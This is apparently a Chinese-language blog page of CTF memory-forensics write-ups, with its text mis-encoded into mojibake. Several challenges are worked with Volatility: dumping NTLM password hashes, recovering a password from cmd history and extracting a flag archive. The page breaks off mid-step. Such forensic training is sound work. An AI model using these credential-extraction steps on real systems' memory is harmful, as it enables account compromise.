(/home/kali/volatility2.6/WIN-BU6IJ7FI9RU-20190927-152050.raw)                        <br>                      PAE <span class="hljs-built_in">type</span> : PAE                                                                                                    <br>                           DTB : 0x185000L                                                                                              <br>                          KDBG : 0x83f61c28L                                                                                            <br>          Number of Processors : 2                                                                                                      <br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0x83f62c00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0x807ca000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2019-09-27 15:20:52 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2019-09-27 23:20:52 +0800                                                                                                                                       <br></code></pre></td></tr></table></figure><p>æ ¹æ®Suggested Profile(s)å€¼ï¼ŒçŒœæµ‹æ˜¯Win7SP1x86_23418çš„é•œåƒ</p><p>æŸ¥çœ‹passwordçš„hashå€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/volatility2<span class="hljs-number">.6</span>]<br>â””â”€<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>CTF:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>a640404b5c386ab12092587fe19cd02:::<br></code></pre></td></tr></table></figure><p>å¯¹CTFç”¨æˆ·çš„å€¼ï¼Œåœ¨çº¿ç½‘ç«™ç ´è§£hash<br><img src="https://img-blog.csdnimg.cn/20210601130636808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="NEWSCTF2021-very-ez-dump"><a href="#NEWSCTF2021-very-ez-dump" class="headerlink" title="[NEWSCTF2021] very-ez-dump"></a>[NEWSCTF2021] very-ez-dump</h3><p>æŸ¥çœ‹é•œåƒä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯Win7SP1x64é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f mem.raw imageinfo                                                    <br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/mem.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x187000L<br>                          KDBG : 0xf8000403e0a0L<br>          Number of Processors : 2<br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff8000403fd00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xfffff880009ef000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image date and time : 2021-05-20 13:08:33 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2021-05-20 21:08:33 +0800<br></code></pre></td></tr></table></figure><p>åˆ—å‡ºè¿›ç¨‹ï¼Œæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f mem.raw  --profile=Win7SP1x64 pslist                                 <br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0xfffffa8000cb2040 System                    4      0     91      519 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80016bbb30 smss.exe                256      4      2       30 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80023c7b30 csrss.exe               348    328      9      437      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa80025c3060 wininit.exe             400    328      3       81      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa8001b6f060 csrss.exe               412    392     10      252      1      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa800262e7c0 winlogon.exe            464    392      5      121      1      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800260ab30 services.exe            484    400      9      206      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002674a90 lsass.exe               516    400     10      573      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800267f060 lsm.exe                 524    400     10      142      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002607b30 svchost.exe             640    484     11      359      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa80026af6a0 svchost.exe             720    484      9      292      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002735b30 svchost.exe             792    484     22      498      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa800275a060 svchost.exe             844    484     11      258      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002776960 svchost.exe             892    484     34      969      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027b5b30 svchost.exe            1000    484     17      698      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027dab30 svchost.exe             368    484     15      371      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002858b30 spoolsv.exe            1040    484     12      272      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800286bb30 svchost.exe            1072    484     18      331      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa8002938b30 VGAuthService.         1228    484      3       87      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800297ab30 taskhost.exe           1344    484      9      175      1      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa8002650b30 vmtoolsd.exe           1404    484     11      278      0      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa80029a9b30 dwm.exe                1648    844      5      149      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002a47b30 explorer.exe           1700   1596     44     1219      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002b0eb30 WmiPrvSE.exe           1920    640      9      217      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002af06c0 dllhost.exe            1996    484     13      197      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b93520 vm3dservice.ex          864   1700      2       41      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b3e060 vmtoolsd.exe           1296   1700      9      193      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8000d60060 msdtc.exe               520    484     12      146      0      0 2021-05-20 11:21:58 UTC+0000                                 <br>0xfffffa8002c42440 SearchIndexer.         2208    484     13      600      0      0 2021-05-20 11:22:01 UTC+0000                                 <br>0xfffffa8002d23880 wmpnetwk.exe           2360    484      9      214      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa8002da6b30 svchost.exe            2520    484     15      258      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa800142d400 sppsvc.exe             2500    484      4      150      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa8002d90060 svchost.exe            2408    484     13      343      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa800104ab30 audiodg.exe            2236    792      7      141      0      0 2021-05-20 11:33:37 UTC+0000                                 <br>0xfffffa80010c7060 cmd.exe                2624   1700      1       21      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8000d81550 conhost.exe            1588    412      2       62      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8001044710 SearchProtocol         2580   2208      8      285      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa80010db9b0 SearchFilterHo          316   2208      5       96      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa8001a29680 dllhost.exe            1888    640      6       87      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa8002c78060 dllhost.exe            1252    640      6       83      0      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa800142f060 DumpIt.exe             2864   1700      1       25      1      1 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e2060 conhost.exe            2824    412      2       61      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e6860 dllhost.exe            2696    640      6       69      1      0 2021-05-20 13:08:34 UTC+0000          <br></code></pre></td></tr></table></figure><p>çœ‹ä¸‹passwordçš„hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f mem.raw  --profile=Win7SP1x64 hashdump<br>Volatility Foundation Volatility Framework 2.6<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::<br>mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f:::                                                                                                                                                                      <br></code></pre></td></tr></table></figure><p>mumuziç”¨æˆ·çš„å¯†ç ç ´è§£ä¸å‡ºæ¥ï¼Œç»§ç»­å¾€ä¸‹çœ‹</p><p>æŸ¥çœ‹cmdä¸‹æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f mem.raw  --profile=Win7SP1x64 cmdscan<br>Volatility Foundation Volatility Framework 2.6<br>**************************************************<br>CommandProcess: conhost.exe Pid: 1588<br>CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 13 LastAdded: 12 LastDisplayed: 12<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x109cf0: dir</span><br>Cmd <span class="hljs-comment">#1 @ 0x108290: ipconfig</span><br>Cmd <span class="hljs-comment">#2 @ 0xf8bd0: ipconfig 192.168.26.2</span><br>Cmd <span class="hljs-comment">#3 @ 0x116aa0: ping newsctf.top</span><br>Cmd <span class="hljs-comment">#4 @ 0x1082d0: network</span><br>Cmd <span class="hljs-comment">#5 @ 0x1082f0: net user</span><br>Cmd <span class="hljs-comment">#6 @ 0xf8c50: net user Guest 123456789</span><br>Cmd <span class="hljs-comment">#7 @ 0xf8c90: net user mumuzi (ljmmz)ovo</span><br>Cmd <span class="hljs-comment">#8 @ 0x108350: clear</span><br>Cmd <span class="hljs-comment">#9 @ 0x116a40: if_you_see_it,</span><br>Cmd <span class="hljs-comment">#10 @ 0xf8cd0: you_will_find_the_flag</span><br>Cmd <span class="hljs-comment">#11 @ 0x116ad0: where_is_the_flag?</span><br>Cmd <span class="hljs-comment">#12 @ 0x1178d0: net user Administrator flag_not_here</span><br>Cmd <span class="hljs-comment">#29 @ 0x90158: </span><br>Cmd <span class="hljs-comment">#30 @ 0x10f920: </span><br>**************************************************<br>CommandProcess: conhost.exe Pid: 2824<br>CommandHistory: 0x357140 Application: DumpIt.exe Flags: Allocated<br>CommandCount: 0 LastAdded: -1 LastDisplayed: -1<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#29 @ 0x2d0158: 5</span><br>Cmd <span class="hljs-comment">#30 @ 0x34f940: 4</span><br></code></pre></td></tr></table></figure><p>è¿™æ¡æŒ‡ä»¤net user mumuzi (ljmmz)ovo  ï¼Œæ·»åŠ äº†ä¸€ä¸ªç”¨æˆ·mumuziï¼Œå¯†ç æ˜¯(ljmmz)ovoï¼Œç»§ç»­å¾€ä¸‹çœ‹</p><p>æŸ¥çœ‹æ–‡ä»¶ï¼Œç”¨grepå‘½ä»¤æŸ¥æ‰¾å«flagçš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f mem.raw  --profile=Win7SP1x64 filescan  | grep flag     <br>Volatility Foundation Volatility Framework 2.6<br>0x000000003e4b2070      2      0 -W-rwd \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br>0x000000003fa56dd0      2      0 RW-rw- \Device\HarddiskVolume1\Users\mumuzi\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°ä¸€ä¸ªflag.zipï¼Œdumpä¸‹æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f mem.raw  --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D news               <span class="hljs-comment">#-Qæ˜¯åç§»é‡ï¼Œ-Dæ˜¯å­˜å‚¨çš„æ–‡ä»¶å¤¹                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x3e4b2070   None   \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br></code></pre></td></tr></table></figure><p>å¸¦å¯†ç çš„å‹ç¼©åŒ…ï¼Œå¯†ç å°±æ˜¯ä¸Šé¢çš„(ljmmz)ovoï¼Œè§£å‹å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;ez_di_imp_1t_y0u_like?&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¦è±æ ¼æ®¿ä¸‹"><a href="#ç¦è±æ ¼æ®¿ä¸‹" class="headerlink" title="ç¦è±æ ¼æ®¿ä¸‹"></a>ç¦è±æ ¼æ®¿ä¸‹</h3><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_43891422/article/details/107852416">https://blog.csdn.net/weixin_43891422/article/details/107852416</a></p><p>1.æŸ¥çœ‹å†…å­˜é•œåƒä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw imageinfo<br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/zy.raw)<br>                      PAE <span class="hljs-built_in">type</span> : PAE<br>                           DTB : 0xaff000L<br>                          KDBG : 0x80546ae0L<br>          Number of Processors : 1<br>     Image Type (Service Pack) : 3<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xffdff000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2020-07-25 16:50:35 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2020-07-26 00:50:35 +0800<br></code></pre></td></tr></table></figure><p>é•œåƒç³»ç»Ÿä¸ºWinXPSP2x86</p><p>2.è·å–è¿›ç¨‹ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86  pslist<br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0x821b9830 System                    4      0     58      254 ------      0                                                              <br>0x81c04ba0 smss.exe                536      4      3       19 ------      0 2020-07-25 15:35:26 UTC+0000                                 <br>0x81f59da0 csrss.exe               604    536     11      365      0      0 2020-07-25 15:35:29 UTC+0000                                 <br>0x82007d10 winlogon.exe            632    536     18      451      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x82085560 services.exe            716    632     16      269      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81c944a8 lsass.exe               728    632     22      355      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81f767f0 vmacthlp.exe            904    716      1       25      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x82054988 svchost.exe             916    716     15      189      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x81c1e2a0 svchost.exe             964    716     11      254      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81d57360 svchost.exe            1104    716     55     1147      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bc5458 svchost.exe            1152    716      4       77      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bcf650 svchost.exe            1192    716     14      198      0      0 2020-07-25 15:35:35 UTC+0000                                 <br>0x81d61650 explorer.exe           1596   1540     16      536      0      0 2020-07-25 15:35:39 UTC+0000                                 <br>0x82006da0 spoolsv.exe            1700    716     10      114      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81ffda48 rundll32.exe           1808   1596      4       78      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x8200a7e0 vmtoolsd.exe           1816   1596      7      246      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81d87c10 ctfmon.exe             1824   1596      1       71      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81feabb8 svchost.exe            1784    716      4       84      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81c96790 VGAuthService.e        1996    716      2       60      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81bf0c10 vmtoolsd.exe            176    716      7      267      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81fe0578 wmiprvse.exe           1040    916     13      237      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81c395a8 wscntfy.exe            1188   1104      1       39      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81bb3498 alg.exe                1552    716      5      102      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81d89da0 notepad.exe            1352   1596      2       92      0      0 2020-07-25 15:38:22 UTC+0000                                 <br>0x8206fda0 conime.exe             1832   1320      1       38      0      0 2020-07-25 15:49:44 UTC+0000                                 <br>0x81d89a08 DumpIt.exe              800   1596      1       25      0      0 2020-07-25 16:50:34 UTC+0000   <br></code></pre></td></tr></table></figure><p>å¯ç–‘ç¨‹åºsmss.exe</p><p>3.æå–è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86  memdump -p 536 -D ./  <br>Volatility Foundation Volatility Framework 2.6<br>************************************************************************<br>Writing smss.exe [   536] to 536.dmp<br></code></pre></td></tr></table></figure><p>4.æŸ¥çœ‹dumpä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ strings -e l 536.dmp | grep flag<br>flag.jpg<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.png<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.lnk<br>flag.jpg<br>\flag.jpg*C:\Documents and Settings\Administrator\<br>flag.png<br>flag.jpg<br>flag.lnk<br>notiflag.exe<br>\Documents and Settings\Administrator\Recent\flag.lnk<br>flag.png<br>flag.jpg<br>flag.png<br>flag.png<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.png<br>\flag.jpg<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br> 1\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>flag.png<br>flag.lnk<br>flag.png<br>\flag.jpg.jpg<br>\flag.png<br> 1\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.png<br> 1\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br>flag.jpg<br>usbflags<br>usbflags<br>usbflags<br>usbflags\vvvvpppprrrr<br>usbflags<br></code></pre></td></tr></table></figure><p>å¯ç–‘æ–‡ä»¶flag.jpgå’Œflag.png</p><p>5.è·å–æµè§ˆå™¨æµè§ˆå†å²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86 iehistory<br>Volatility Foundation Volatility Framework 2.6<br></code></pre></td></tr></table></figure><p>åœ¨å¤§å¸ˆå‚…åšå®¢é‡Œé¢èƒ½çœ‹åˆ°hint.txtï¼Œä½†æˆ‘è¿™é‡Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œç»§ç»­å¾€ä¸‹çœ‹å§</p><p>6.æ‰«æå¹¶æå–æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep hint<br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002456028      1      0 RW-r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure><p>7.ä½¿ç”¨dumpfilesæå–æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002456028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02456028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure><p>å¾—åˆ°file.None.0x821231b8.dat<br><img src="https://img-blog.csdnimg.cn/20210603204442392.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¿®æ”¹åç¼€ä¸ºtxtï¼Œhintæç¤ºæ–‡ä»¶åä¸ºfl4g</p><p>8.æ‰«ææŸ¥æ‰¾fl4gæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td 